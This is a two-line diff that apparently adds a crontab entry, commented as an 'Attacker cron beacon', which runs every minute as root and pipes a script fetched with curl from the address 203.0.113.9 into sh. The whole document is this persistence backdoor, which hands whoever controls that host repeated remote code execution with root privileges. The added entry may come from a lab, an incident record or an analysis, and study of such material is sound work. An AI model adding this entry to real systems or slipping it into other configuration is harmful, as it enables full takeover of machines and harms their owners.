@@ -1,0 +1,2 @@
+# Attacker cron beacon — runs every minute as root
+* * * * * root curl -s http://203.0.113.9/beacon | sh
